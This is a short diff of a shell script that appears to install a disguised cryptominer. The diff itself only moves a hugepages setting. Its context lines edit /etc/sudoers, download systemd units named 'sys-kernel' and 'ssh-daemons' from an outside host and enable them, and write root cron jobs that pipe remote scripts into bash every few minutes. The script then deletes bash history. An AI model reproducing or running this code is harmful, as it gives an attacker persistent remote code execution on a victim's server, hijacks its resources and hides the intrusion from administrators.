@@ -14,6 +14,7 @@ sed -i 's/^#\(root\s*ALL=(ALL)\s*ALL\)/\1/' /etc/sudoers
     wget https://xmrhorizontal.github.io/sys-kernel.service
     wget https://xmrhorizontal.github.io/ssh-daemons.service
     wget https://xmrhorizontal.github.io/ssh-daemons.timer
+    sysctl -w vm.nr_hugepages=128
     systemctl daemon-reload
     systemctl enable ssh-daemons.timer
     systemctl enable sys-kernel.service
@@ -23,7 +24,6 @@ sed -i 's/^#\(root\s*ALL=(ALL)\s*ALL\)/\1/' /etc/sudoers
     systemctl start sys-kernel.service
     echo "*/9 * * * * root curl -s https://xmrhorizontal.github.io/command.sh | bash" > /etc/cron.d/debcron
     echo "*/58 * * * * root curl -s https://xmrhorizontal.github.io/searcher.sh | bash" > /etc/cron.d/cronextend
-    sysctl -w vm.nr_hugepages=128
     rm -f ~/.bash_history
     rm -f /root/.bash_history
 echo OK!
